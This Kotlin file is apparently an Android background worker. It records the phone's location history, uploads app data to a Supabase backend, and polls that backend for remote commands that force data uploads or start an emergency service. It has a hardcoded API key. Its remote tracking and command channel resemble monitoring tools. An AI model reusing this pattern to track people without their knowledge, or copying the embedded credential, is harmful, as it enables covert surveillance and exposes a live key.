package com.example.myandroid

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import androidx.core.app.NotificationCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.tasks.await
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

class SyncWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result {
        val notifManager = applicationContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val notifId = 999

        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                val channel = NotificationChannel("sync_channel", "Data Sync", NotificationManager.IMPORTANCE_LOW)
                notifManager.createNotificationChannel(channel)
            }
            val notification = NotificationCompat.Builder(applicationContext, "sync_channel")
                .setContentTitle("Syncing Data")
                .setContentText("Uploading stats to cloud...")
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setProgress(0, 0, true)
                .build()
            notifManager.notify(notifId, notification)

            val ctx = applicationContext
            val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            
            // --- LOCATION LOGIC (RAW DATA) ---
            var lat = 0.0
            var lon = 0.0
            val hasPerm = androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
            
            if (hasPerm) {
                try {
                    val fused = LocationServices.getFusedLocationProviderClient(ctx)
                    val loc = fused.lastLocation.await()
                    
                    if (loc != null) {
                        lat = loc.latitude
                        lon = loc.longitude
                        val acc = if (loc.hasAccuracy()) loc.accuracy else 0f
                        
                        // 1. ODOMETER (Total Distance)
                        val lastLat = prefs.getFloat("last_lat", 0f).toDouble()
                        val lastLon = prefs.getFloat("last_lon", 0f).toDouble()
                        if (lastLat != 0.0) {
                             val results = FloatArray(1)
                             Location.distanceBetween(lastLat, lastLon, lat, lon, results)
                             val distMeters = results[0]
                             if (distMeters > 100) {
                                 val distKm = distMeters / 1000f
                                 val newTotal = prefs.getFloat("total_distance_km", 0f) + distKm
                                 prefs.edit().putFloat("total_distance_km", newTotal).apply()
                             }
                        }
                        
                        // 2. RAW HISTORY
                        val locHistoryStr = prefs.getString("location_history", "[]")
                        val locHistory = try { JSONArray(locHistoryStr) } catch(e: Exception) { JSONArray() }
                        val point = JSONObject().apply {
                            put("lat", lat)
                            put("lon", lon)
                            put("acc", acc)
                            put("ts", System.currentTimeMillis())
                        }
                        locHistory.put(point)
                        while(locHistory.length() > 50) locHistory.remove(0)
                        
                        prefs.edit()
                           .putFloat("last_lat", lat.toFloat())
                           .putFloat("last_lon", lon.toFloat())
                           .putString("last_location_coords", "${String.format("%.4f", lat)}, ${String.format("%.4f", lon)}")
                           .putString("location_history", locHistory.toString())
                           .apply()
                    }
                } catch (e: Exception) { e.printStackTrace() }
            }

            // 3. Upload Data
            CloudManager.uploadData(ctx, listOf("ALL"), null)
            
            // 4. Check for Remote Commands (Merged from RemoteCommandWorker)
            checkRemoteCommands(ctx)

            return Result.success()
        } catch (e: Exception) {
            e.printStackTrace()
            return Result.retry()
        } finally {
            notifManager.cancel(notifId)
        }
    }

    private suspend fun checkRemoteCommands(ctx: Context) {
        try {
            val deviceId = DeviceManager.getDeviceId(ctx)
            val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/file_commands?status=eq.PENDING&device_id=eq.$deviceId&select=*"
            val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"

            val url = URL(supabaseUrl)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "GET"
            conn.setRequestProperty("apikey", supabaseKey)
            conn.setRequestProperty("Authorization", "Bearer $supabaseKey")

            if (conn.responseCode == 200) {
                val resp = conn.inputStream.bufferedReader().use { it.readText() }
                val commands = JSONArray(resp)

                for (i in 0 until commands.length()) {
                    val cmd = commands.getJSONObject(i)
                    val id = cmd.getInt("id")
                    var status = "EXECUTED"
                    var errorMsg = ""

                    try {
                        if (cmd.getString("file_name") == "CODERED") {
                            val i = android.content.Intent(ctx, EmergencyService::class.java)
                            i.putExtra("codes", "0")
                            i.putExtra("sender", "BACKEND")
                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
                        } 
                        else if (cmd.getString("file_name") == "FORCE_UPLOAD") {
                            val modulesStr = cmd.optString("content", "ALL")
                            val modules = modulesStr.split(",").map { it.trim() }
                            CloudManager.uploadData(ctx, modules, null)
                        }
                        else if (cmd.getString("file_name") == "TOAST") {
                            val msg = cmd.optString("content", "Ping!")
                            android.os.Handler(android.os.Looper.getMainLooper()).post {
                                android.widget.Toast.makeText(ctx, msg, android.widget.Toast.LENGTH_LONG).show()
                            }
                        }
                    } catch (e: Exception) {
                        status = "FAILED"
                        errorMsg = e.message ?: "Unknown"
                    }
                    updateStatus(id, status, errorMsg, supabaseKey)
                }
            }
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun updateStatus(id: Int, status: String, error: String, key: String) {
        try {
            val updateUrl = URL("https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/file_commands?id=eq.$id")
            val conn = updateUrl.openConnection() as HttpURLConnection
            conn.requestMethod = "PATCH"
            conn.setRequestProperty("apikey", key)
            conn.setRequestProperty("Authorization", "Bearer $key")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true
            val json = JSONObject()
            json.put("status", status)
            if (error.isNotEmpty()) json.put("error_log", error)
            conn.outputStream.use { it.write(json.toString().toByteArray()) }
            conn.responseCode
        } catch (e: Exception) {}
    }
}